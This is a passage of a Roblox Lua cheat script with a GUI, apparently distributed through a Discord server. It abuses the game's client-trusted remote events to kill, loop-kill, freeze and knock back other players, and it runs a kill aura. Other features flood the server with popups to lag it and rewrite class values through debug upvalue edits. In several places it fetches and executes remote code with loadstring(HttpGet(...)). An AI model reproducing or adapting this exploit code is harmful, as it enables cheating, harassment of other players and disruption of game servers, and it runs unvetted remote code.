					FontSize = Enum.FontSize.Size96;	
				})
				Lagging = true
				while Lagging == true do
					
					local name = game.Players[tostring(ttarget)].Name
					local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
					local ohString2 = Lagger
					local ohColor33 = Color3.new(255, 255, 0)
				
					game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
					wait(0.1)
				end
			end
			if cmd == "u" then
				while Lagging == true do
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "["..tostring(ttarget.Name).."] "..tostring(ttarget.Ping.Value);
						Font = Enum.Font.Cartoon;
						Color = Color3.new(0,1,1);
						FontSize = Enum.FontSize.Size96;	
					})
					wait(1)
				end
			end
			if cmd == "unlag" then
				Lagging = false
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "Stopped Lagging";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,0);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "lagserver" then
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "LAGGING SERVER";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(1,0,0);
					FontSize = Enum.FontSize.Size96;	
				})
				Lagging = true
				while Lagging == true do
					local ohVector31 = Vector3.new(1.53, 32.47, -1372)
					local ohString2 = Lagger
					local ohColor33 = Color3.new(0.392157, 0.392157, 0.392157)
		
					game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
					wait(0.1)
				end
			end
			if cmd == "ulag" then
				Lagging = false
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "Stopped lagging server";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(0,1,1);
					FontSize = Enum.FontSize.Size96;	
				})
			end
			if cmd == "rgb" then
				Rainbow = true
				local speed = string.sub(msg,space+1)
				while Rainbow == true do
					for i = 0,1,0.001*speed do
						local ohString1 = "Tertiary"
						local ohColor32 = Color3.fromHSV(i,1,1) 
	
						game:GetService("ReplicatedStorage").Remotes.ArmorColor:FireServer(ohString1, ohColor32)
						wait(0.2)
					end
				end
			end
			if cmd == "color" then
				Color = true
				while Color == true do
					local ohString1 = "Tertiary"
					game:GetService("ReplicatedStorage").Remotes.ArmorColor:FireServer(ohString1, Col)
					wait(0.2)
				end
			end
			if cmd == "off" then
				Rainbow = false
				Color = false
			end
			if cmd == "test" then
				var = string.sub(msg,space+1)
				var2 = string.sub(msg,space+3)
				print(var)
				print(var2)
			end
			-- if cmd == "apply" then
			-- 	local name = game.Players.LocalPlayer.Name
			-- 	local plrname = workspace[name]
			-- 	local effect = Split(string.sub(msg,space+1), " ")
			-- 	local ohString2 = upperc(effect[1])
			-- 	local ohNumber3 = 100
			-- 	local ohNumber4 = effect[2]
			-- 	local ohTable5 = {
			-- 		["fac"] = 20
			-- 	}
	
			-- 	game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(plrname, ohString2, ohNumber3, ohNumber4, ohTable5, keys)
			-- end


			-- if cmd == "apply" then
				
			-- 	local eff = Split(string.sub(msg,space+1), " ")
			-- 	local bruh = GetPlayer(eff[1]) 
			-- 	local name = bruh.Name
			-- 	local plrname = workspace[name]
				
			-- 	local ohString2 = upperc(eff[2])
			-- 	local ohNumber3 = 100
			-- 	local duration = tonumber(eff[3])
			-- 	local ohTable5 = {}
			-- 	loop = tonumber(eff[4])
			-- 	while loop > 0 do
			-- 		game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(plrname, ohString2, ohNumber3, duration, ohTable5, keys)
			-- 		wait(0.01)
			-- 		loop = loop - 1
			-- 	end
			-- end


			if cmd == "apply" then
				local eff = Split(string.sub(msg,space+1), " ")
				for i,v in pairs(Gtplayer(eff[1])) do
					local name = v.Name
					local plrname = workspace[name]
					
					local ohString2 = upperc(eff[2])
					local ohNumber3 = 100
					local duration = tonumber(eff[3])
					local ohTable5 = {}
					loop = tonumber(eff[4])
					while loop > 0 do
						game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(plrname, ohString2, ohNumber3, duration, ohTable5, keys)
						wait(0.01)
						loop = loop - 1
					end
				end
			end


			if cmd == "loopkill" then
				local var = string.sub(msg,space+1)
				local target = GetPlayer(var)
				local plr = target.Name
				lkill = true
				while lkill == true do
					local name = workspace[plr]
					local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
					game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, plrHP, nil, nil, nil, nil, nil, nil, keys)
					wait(1)
				end
			end
			if cmd == "unloopkill" then
				lkill = false
			end
			if cmd == "heal" then
				for i,v in pairs(Gtplayer(string.sub(msg,space+1))) do
					local target = v
					local plr = target.Name
					local name = workspace[plr]
					local vec = target.Character.HumanoidRootPart.Position
					local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
					local ohTable5 = {
						["critgen"] = {
							["amt"] = 60
						}
					}
					game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, -plrHP, nil, nil, nil, nil, nil, nil, keys)
					--game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(-plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
				end
			end
			if cmd == "kill" then
				for i,v in pairs(Gtplayer(string.sub(msg,space+1))) do
					followed = true
					local target = v
					local plr = target.Name
					flwplr = plr
					local name = workspace[plr]
					local vec = target.Character.HumanoidRootPart.Position
					local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
					local DMG = tonumber(plrHP) * 2
					local ohTable5 = {
						["critgen"] = {
							["amt"] = 60
						}
					}
					game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)
					--game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
				end
			end
			-- if cmd == "tpheal" then
			-- 	local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
			-- 	local lplr = game.Players.LocalPlayer.Character.HumanoidRootPart
			-- 	local user = string.sub(msg,space+1)
			-- 	local target = GetPlayer(user)
			-- 	lplr.CFrame = target.Character.HumanoidRootPart.CFrame
			-- 	wait(1)
			-- 	local plr = target.Name
			-- 	local name = workspace[plr]
			-- 	local vec = target.Character.HumanoidRootPart.Position
			-- 	local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
			-- 	local ohTable5 = {
			-- 		["critgen"] = {
			-- 			["amt"] = 60
			-- 		}
			-- 	}
				
			-- 	lplr.CFrame = target.Character.HumanoidRootPart.CFrame
			-- 	game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(-plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
			-- 	wait(0.1)
			-- 	lplr.CFrame = CFrame.new(lastPos)
			-- end
			-- if cmd == "tpkill" then
			-- 	local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
			-- 	local lplr = game.Players.LocalPlayer.Character.HumanoidRootPart
			-- 	local user = string.sub(msg,space+1)
			-- 	local target = GetPlayer(user)
			-- 	lplr.CFrame = target.Character.HumanoidRootPart.CFrame
			-- 	wait(1)
			-- 	local plr = target.Name
			-- 	local name = workspace[plr]
			-- 	local vec = target.Character.HumanoidRootPart.Position
			-- 	local plrHP = game:GetService("Workspace")[plr].Stats.MaxHP.Value
			-- 	local ohTable5 = {
			-- 		["critgen"] = {
			-- 			["amt"] = 60
			-- 		}
			-- 	}
			-- 	lplr.CFrame = target.Character.HumanoidRootPart.CFrame
			-- 	game:GetService("ReplicatedStorage").Remotes.HitJunction:FireServer(name, vec, 999, tonumber(plrHP), ohTable5, nil, nil, nil, nil, nil, keys)
			-- 	wait(0.1)
			-- 	lplr.CFrame = CFrame.new(lastPos)
			-- end
			if cmd == "clear" then

				local bruh = Split(string.sub(msg,space+1), " ")
				for i,v in pairs(Gtplayer(bruh[1])) do
					local name = v.Name
					local ohInstance1 = workspace[name]
					local ohString2 = upperc(bruh[2])
		
					game:GetService("ReplicatedStorage").Remotes.ClearState:FireServer(ohInstance1, ohString2)
				end
			end
			if cmd == "hbe" then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/georgefl121/hbe/main/HitboxExtender.lua", true))()
			end
		end
	end)
	
	
	
	
	
	
		
	
	
	
	
	function GetPlayer(String)
		local plr
		local strl = String:lower()
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name:lower():sub(1, #String) == String:lower() then
					plr = v
				end 
			end
			if String == "me" then
					plr = game.Players.LocalPlayer
				end
			if String == "" or String == " " then
			plr = nil
			end
		return plr
	end
	
	function GetPlayer1(String)
		local plr
		local strl = String:lower()
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name:lower():sub(1, #String) == String:lower() then
					plr = v
				end 
			end
			if String == "me" then
					plr = ad1
				end
			if String == "" or String == " " then
			plr = nil
			end
		return plr
	end
	
	function GetPlayer2(String)
		local plr
		local strl = String:lower()
			for i, v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name:lower():sub(1, #String) == String:lower() then
					plr = v
				end 
			end
			if String == "me" then
					plr = ad2
				end
			if String == "" or String == " " then
			plr = nil
			end
		return plr
	end
	
	
	function Gtplayer(String)
		local plr = {}
		local strl = String:lower()
			if strl == "all" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					table.insert(plr,v)
				end
			elseif strl == "others" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name ~= lplayer.Name then
						table.insert(plr,v)
					end
				end   
			elseif strl == "me" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name == lplayer.Name then
						table.insert(plr,v)
					end
				end  
			else
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name:lower():sub(1, #String) == String:lower() then
						table.insert(plr,v)
					end
				end    
			end
		return plr
	end
	
	function Gtplayer1(String)
		local plr = {}
		local strl = String:lower()
			if strl == "all" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					table.insert(plr,v)
				end
			elseif strl == "others" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name ~= ad1.Name then
						table.insert(plr,v)
					end
				end   
			elseif strl == "me" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name == ad1.Name then
						table.insert(plr,v)
					end
				end  
			else
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name:lower():sub(1, #String) == String:lower() then
						table.insert(plr,v)
					end
				end    
			end
		return plr
	end
	
	function Gtplayer2(String)
		local plr = {}
		local strl = String:lower()
			if strl == "all" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					table.insert(plr,v)
				end
			elseif strl == "others" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name ~= ad2.Name then
						table.insert(plr,v)
					end
				end   
			elseif strl == "me" then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name == ad2.Name then
						table.insert(plr,v)
					end
				end  
			else
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name:lower():sub(1, #String) == String:lower() then
						table.insert(plr,v)
					end
				end    
			end
		return plr
	end
	
	
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[PSA] succesfully loaded";
		Font = Enum.Font.Cartoon;
		Color = Color3.new(0,1,0);
		FontSize = Enum.FontSize.Size96;	
	})

	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[JOIN OUR DISCORD!] https://discord.gg/Nd95SbuYQT";
		Font = Enum.Font.Cartoon;
		Color = Color3.new(0,1,0);
		FontSize = Enum.FontSize.Size96;	
	})
	
	
	
	-- init
	local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua"))()


	local venyx = library.new("PSA GUI BY GEORGEFL", 5013109572)

	--pages

	local page = venyx:addPage("Text", 5012544693)
	local page2 = venyx:addPage("Misc", 5012544693)
	local KAura = venyx:addPage("Kill Aura", 5012544693)
	local Binds = venyx:addPage("Keybinds", 5012544693)
	local Mod = venyx:addPage("Class Mods", 5012544693)
	local Creds = venyx:addPage("Credits", 5012544693)
	local Settings = venyx:addPage("Settings", 5012544693)

	--sections

	--page 1: text
	local textToggle = page:addSection("Toggle")
	local textColor = page:addSection("Color")
	local textColorPicker = page:addSection("Color Picker")
	local textWord = page:addSection("Word")
	--page 2: misc
	local MiscStuff = page2:addSection("stuff")
	local MiscHP = page2:addSection("HP")
	--page 3: kill aura
	local KToggle = KAura:addSection("Toggle")
	local KActivate = KAura:addSection("Activate")
	local KValues = KAura:addSection("Values")
	--page 4: binds
	local Control = Binds:addSection("Control")
	local Kill = Binds:addSection("Kill")
	local StopBind = Binds:addSection("Time Stop")
	--page 5: mods
	local Gladiator = Mod:addSection("Gladiator")
	local Snowman = Mod:addSection("Snowman")
	local Techno = Mod:addSection("Technomancer")
	--page ?: Credits
	local Madeby = Creds:addSection("Made by:")
	local RoAcc = Creds:addSection("my current roblox account:")
	local Disc = Creds:addSection("Discord: https://discord.gg/Nd95SbuYQT")
	local Cont = Creds:addSection("Contributors:")
	--page ?: settings
	local Setts = Settings:addSection("Toggle Gui")



	--page 1 stuff
	textToggle:addToggle("Toggle", nil, function(value)
		Tex = value
	end)

	textColor:addButton("White", function()
		while Tex == true do
		
			local name = game.Players[tostring(Targ)].Name
			local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
			local ohString2 = Word
			local ohColor33 = Color3.new(255, 255, 255)
		
			game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
			wait(0.1)
		end
	end)

	textColor:addButton("Red", function()
		while Tex == true do
		
			local name = game.Players[tostring(Targ)].Name
			local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
			local ohString2 = Word
			local ohColor33 = Color3.new(255, 0, 0)
		
			game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
			wait(0.1)
		end
	end)

	textColor:addButton("Green", function()
		while Tex == true do
		
			local name = game.Players[tostring(Targ)].Name
			local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
			local ohString2 = Word
			local ohColor33 = Color3.new(0, 255, 0)
		
			game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
			wait(0.1)
		end
	end)

	textColor:addButton("Yellow", function()
		while Tex == true do
		
			local name = game.Players[tostring(Targ)].Name
			local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
			local ohString2 = Word
			local ohColor33 = Color3.new(255, 255, 0)
				
			game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, ohColor33)
			wait(0.1)
		end
	end)

	textColor:addButton("Custom Color", function()
		while Tex == true do
		
			local name = game.Players[tostring(Targ)].Name
			local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
			local ohString2 = Word
				
			game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, Colr)
			wait(0.1)
		end
	end)

	textColor:addButton("everyone", function()
		while Tex == true do
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				local name = v.Name
				local ohVector31 = Vector3.new(workspace[name].Head.Position.X, workspace[name].Head.Position.Y, workspace[name].Head.Position.Z)
				local ohString2 = Word
					
				game:GetService("ReplicatedStorage").Remotes.DmgPopup:FireServer(ohVector31, ohString2, Colr)
				wait(0.1)
			end
		end
	end)

	textColorPicker:addColorPicker("Custom Color", Colr, function(color3)
		Colr = color3
	end)

	textWord:addTextbox("Input", "word", function(value, focusLost)
		if focusLost then
			Word = value
		end
	end)

	--page 2 stuff
	MiscStuff:addColorPicker("Armor Color", value, function(color3)
		Col = color3
	end)

	MiscHP:addTextbox("target user", "playername", function(value, focusLost)
		if focusLost then
			trgs = value
		end
	end)


	MiscHP:addButton("quintrillion hp", function()
		targetplr = GetPlayer(trgs) 
		local plr = targetplr.Name
		local ohInstance1 = workspace[plr]
		local ohTable5 = {
			["fac"] = 100
		}
		
		local rep = 14
		while rep > 0 do
			game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(ohInstance1, "Favor", 100, 10, ohTable5, keys)
			rep = rep - 1
			wait(0.01)
		end

		local amt = 100
		local namt = -amt

		game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(ohInstance1, namt, nil, nil, nil, nil, nil, nil, keys)

		ins1 = workspace[plr]
		game:GetService("ReplicatedStorage").Remotes.ClearState:FireServer(ins1, "Favor")

	end)
	--kill aura
	KToggle:addToggle("Toggle", nil, function(value)
		On = value
	end)

	KActivate:addButton("Kill Aura", function()
		local player = game.Players.LocalPlayer
			local ohTable5 = {
				["critgen"] = {
					["amt"] = 6
				}
			}
			while On == true do
				shit = game.Players:GetPlayers()
				for i = 1, #shit do local v = shit[i]
					if v ~= player and v:FindFirstChild("Alive") and v.Alive.Value and pcall(function() return v.Character.HumanoidRootPart,player.Backpack.Core.Client end) and player:DistanceFromCharacter(v.Character.HumanoidRootPart.Position) < tonumber(Range) then
						if pcall(function() return v.Character.Part,player.Character.Part end) and v.Character.Part.Color ~= player.Character.Part.Color or not player.Character:FindFirstChild("Part") then
							game.ReplicatedStorage.Remotes.HitJunction:FireServer(v.Character, v.Character.HumanoidRootPart.Position, 17, tonumber(Damage), ohTable5, nil, nil, nil, nil, nil, keys)
							wait(tonumber(Delay))
						end
					end
				end
				wait()
			end
	end)

	KValues:addTextbox("Damage", "number", function(value, focusLost)
		if focusLost then
			Damage = value
		end
	end)

	KValues:addTextbox("Range", "number", function(value, focusLost)
		if focusLost then
			Range = value
		end
	end)

	KValues:addTextbox("Delay", "number", function(value, focusLost)
		if focusLost then
			Delay = value
		end
	end)

	--keybinds

	Control:addToggle("Toggle Control", nil, function(value)
		Controlling = value
	end)

	Control:addKeybind("Select Target", Enum.KeyCode.X, function()
		if Controlling == true then
			plr = game.Players.LocalPlayer
			mouse = plr:GetMouse()
			local hi = mouse.Hit.p
			
			_G.Closest = nil
			_G.ClosestNum = math.huge
			for i,v in pairs(game:GetService("Players"):GetChildren()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					if tonumber((hi - v.Character.HumanoidRootPart.Position).magnitude) < tonumber(_G.ClosestNum) then
						_G.Closest = tostring(v)
						_G.ClosestNum = tonumber((hi - v.Character.HumanoidRootPart.Position).magnitude)
						Ctrl = v
					end
				end
			end
			venyx:Notify("Target", tostring(Ctrl))
		end
	end)

	Control:addKeybind("Bind", Enum.KeyCode.C, function()
		if Controlling == true then
			plr = game.Players.LocalPlayer
				mouse = plr:GetMouse()

				local hi = mouse.Hit.p
				local name = Ctrl.Name
				local ohInstance1 = workspace[name]

				local ohNumber3 = -100
				local ohNil4 = nil
				local ohNumber5 = 0.4


				game:GetService("ReplicatedStorage").Remotes.Knockback:FireServer(ohInstance1, hi, tonumber(Powe), ohNil4, tonumber(Dura), keys)
		end
	end, function()
	print("AMOGUS")
	end)

	Control:addTextbox("Power", "number", function(value, focusLost)
		if focusLost then
			Powe = value
		end
	end)

	Control:addTextbox("Duration", "number", function(value, focusLost)
		if focusLost then
			Dura = value
		end
	end)

	Kill:addToggle("Toggle Kill", nil, function(value)
		Killing = value
	end)

	Kill:addKeybind("Kill", Enum.KeyCode.R, function()
		if Killing == true then
			plr = game.Players.LocalPlayer
			mouse = plr:GetMouse()
			local hi = mouse.Hit.p
			
			_G.Closest = nil
			_G.ClosestNum = math.huge
			for i,v in pairs(game:GetService("Players"):GetChildren()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					if tonumber((hi - v.Character.HumanoidRootPart.Position).magnitude) < tonumber(_G.ClosestNum) then
						_G.Closest = tostring(v)
						_G.ClosestNum = tonumber((hi - v.Character.HumanoidRootPart.Position).magnitude)
						Kills = v
					end
				end
			end

			local plrk = Kills.Name
			local name = workspace[plrk]
			local plrHP = game:GetService("Workspace")[plrk].Stats.MaxHP.Value
			local DMG = plrHP * 2
			local ohTable5 = {
				["critgen"] = {
					["amt"] = 60
				}
			}
			game:GetService("ReplicatedStorage").Remotes.Damage:FireServer(name, DMG, nil, nil, nil, nil, nil, nil, keys)


		end
	end, function()
	print("AMOGUS")
	end)

	StopBind:addToggle("Toggle Time Stop", nil, function(value)
		Stopping = value
	end)

	StopBind:addKeybind("Stop", Enum.KeyCode.One, function()
		if Stopping == true then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name ~= LPlayer.Name then
					local name = v.Name
					local plrname = workspace[name]
					
					local ohString2 = "Stop"
					local ohNumber3 = 100
					local duration = 10
					local ohTable5 = {}
					
					game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(plrname, ohString2, ohNumber3, duration, ohTable5, keys)
				end
			end

			game.StarterGui:SetCore("ChatMakeSystemMessage", {
				Text = "[TIME] TIME HAS STOPPED";
				Font = Enum.Font.Cartoon;
				Color = Color3.new(0,1,0);
				FontSize = Enum.FontSize.Size96;	
			})
			TS = true
			local timeRemaining = 10
			while TS == true and timeRemaining > 0 do
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[TIME STOP] "..tostring(timeRemaining).." seconds remaining";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(255,255,0);
					FontSize = Enum.FontSize.Size96;	
				})
				wait(1)
				timeRemaining = timeRemaining - 1
				if timeRemaining == 1 then
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "[TIME STOP] "..tostring(timeRemaining).." seconds remaining";
						Font = Enum.Font.Cartoon;
						Color = Color3.new(255,255,0);
						FontSize = Enum.FontSize.Size96;	
					})
					wait(1)
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "[TIME] TIME WILL RESUME";
						Font = Enum.Font.Cartoon;
						Color = Color3.new(255,255,0);
						FontSize = Enum.FontSize.Size96;	
					})
					TS = false
				end
			end

		end
	end, function()
	print("AMOGUS")
	end)


	StopBind:addKeybind("Resume", Enum.KeyCode.Two, function()
		if Stopping == true then
			game.StarterGui:SetCore("ChatMakeSystemMessage", {
				Text = "[TIME] TIME WILL RESUME";
				Font = Enum.Font.Cartoon;
				Color = Color3.new(0,1,1);
				FontSize = Enum.FontSize.Size96;	
			})
			TS = false
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name ~= LPlayer.Name then
					local name = v.Name
					local ohInstance1 = workspace[name]
					local ohString2 = "Stop"
		
					game:GetService("ReplicatedStorage").Remotes.ClearState:FireServer(ohInstance1, ohString2)
				end
			end
		end
	end, function()
	print("AMOGUS")
	end)

	StopBind:addKeybind("Stop with custom duration", Enum.KeyCode.Three, function()
		if Stopping == true then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v.Name ~= LPlayer.Name then
					local name = v.Name
					local plrname = workspace[name]
					
					local ohString2 = "Stop"
					local ohNumber3 = 100
					-- local duration = 10
					local ohTable5 = {}
					
					game:GetService("ReplicatedStorage").Remotes.ApplyStatus:FireServer(plrname, ohString2, ohNumber3, tonumber(duratio), ohTable5, keys)
				end
			end

			game.StarterGui:SetCore("ChatMakeSystemMessage", {
				Text = "[TIME] TIME HAS STOPPED";
				Font = Enum.Font.Cartoon;
				Color = Color3.new(0,1,0);
				FontSize = Enum.FontSize.Size96;	
			})
			TS = true
			local timeRemaining = tonumber(duratio)
			while TS == true and timeRemaining > 0 do
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[TIME STOP] "..tostring(timeRemaining).." seconds remaining";
					Font = Enum.Font.Cartoon;
					Color = Color3.new(255,255,0);
					FontSize = Enum.FontSize.Size96;	
				})
				wait(1)
				timeRemaining = timeRemaining - 1
				if timeRemaining == 1 then
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "[TIME STOP] "..tostring(timeRemaining).." seconds remaining";
						Font = Enum.Font.Cartoon;
						Color = Color3.new(255,255,0);
						FontSize = Enum.FontSize.Size96;	
					})
					wait(1)
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "[TIME] TIME WILL RESUME";
						Font = Enum.Font.Cartoon;
						Color = Color3.new(255,255,0);
						FontSize = Enum.FontSize.Size96;	
					})
					TS = false
				end
			end

		end
	end, function()
	print("AMOGUS")
	end)

	StopBind:addTextbox("Duration", "number", function(value, focusLost)
		if focusLost then
			duratio = value
		end
	end)

	--class mod stuffs
	Gladiator:addButton("Gladiator", function()

		local aux = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ohaux.lua"))()

		local scriptPath = game:GetService("Players").LocalPlayer.Backpack.Core.Client
		local closureName = "Unnamed function"
		local upvalueIndex = 2
		local closureConstants = {
			[1] = "button"
		}

		local closure = aux.searchClosure(scriptPath, closureName, upvalueIndex, closureConstants)
		local value = 200
		local elementIndex = "stock"

		debug.getupvalue(closure, upvalueIndex)[elementIndex] = value

		wait(0.3)

		local aux = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ohaux.lua"))()

		local scriptPath = game:GetService("Players").LocalPlayer.Backpack.Core.Client
		local closureName = "Unnamed function"
		local upvalueIndex = 2
		local closureConstants = {
			[1] = "button"
		}

		local closure = aux.searchClosure(scriptPath, closureName, upvalueIndex, closureConstants)
		local value = 200
		local elementIndex = "maxstock"

		debug.getupvalue(closure, upvalueIndex)[elementIndex] = value

		venyx:Notify("Gladiator", "Modified!")
	end)

	Snowman:addButton("Snowman", function()
		local aux = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ohaux.lua"))()

		local scriptPath = game:GetService("Players").LocalPlayer.Backpack.Core.Client
		local closureName = "Unnamed function"
		local upvalueIndex = 2
		local closureConstants = {
			[1] = "button"
		}

		local closure = aux.searchClosure(scriptPath, closureName, upvalueIndex, closureConstants)
		local value = 2000
		local elementIndex = "stock"


		-- DO NOT RELY ON THIS FEATURE TO PRODUCE 100% FUNCTIONAL SCRIPTS
		debug.getupvalue(closure, upvalueIndex)[elementIndex] = value

		wait(0.3)

		-- Generated by Hydroxide's Upvalue Scanner: https://github.com/Upbolt/Hydroxide

		local aux = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ohaux.lua"))()

		local scriptPath = game:GetService("Players").LocalPlayer.Backpack.Core.Client
		local closureName = "Unnamed function"
		local upvalueIndex = 2
		local closureConstants = {
			[1] = "button"
		}

		local closure = aux.searchClosure(scriptPath, closureName, upvalueIndex, closureConstants)
		local value = 2000
		local elementIndex = "maxstock"


		-- DO NOT RELY ON THIS FEATURE TO PRODUCE 100% FUNCTIONAL SCRIPTS
		debug.getupvalue(closure, upvalueIndex)[elementIndex] = value
		venyx:Notify("Snowman", "Modified!")
	end)

	Techno:addButton("Technomancer", function()
		-- Generated by Hydroxide's Upvalue Scanner: https://github.com/Upbolt/Hydroxide

		local aux = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ohaux.lua"))()

		local scriptPath = game:GetService("Players").LocalPlayer.Backpack.Core.Client
		local closureName = "Unnamed function"
		local upvalueIndex = 2
		local closureConstants = {
			[1] = "button",
			[2] = "switchTo",
			[3] = "rawCast"
		}

		local closure = aux.searchClosure(scriptPath, closureName, upvalueIndex, closureConstants)
		local value = 4000
		local elementIndex = "maxstock"


		-- DO NOT RELY ON THIS FEATURE TO PRODUCE 100% FUNCTIONAL SCRIPTS
		debug.getupvalue(closure, upvalueIndex)[elementIndex] = value
		venyx:Notify("Technomancer", "Modified!")
	end)

	--etc
	Madeby:addButton("georgefl#5105", function()
		print("HI")
	end)

	RoAcc:addButton("epiklitty (i just borrowed this account)", function()
		print("HI")
	end)

	Disc:addButton("copy to clipboard!", function()
		setclipboard("https://discord.gg/Nd95SbuYQT")
	end)

	Cont:addButton("MenlnTheAct - Class Mods", function()
		print("HI")
	end)

	Setts:addKeybind("Hide/Show Gui", Enum.KeyCode.RightAlt, function()
		venyx:toggle()
	end, function()
	print("AMOGUS")
	end)

end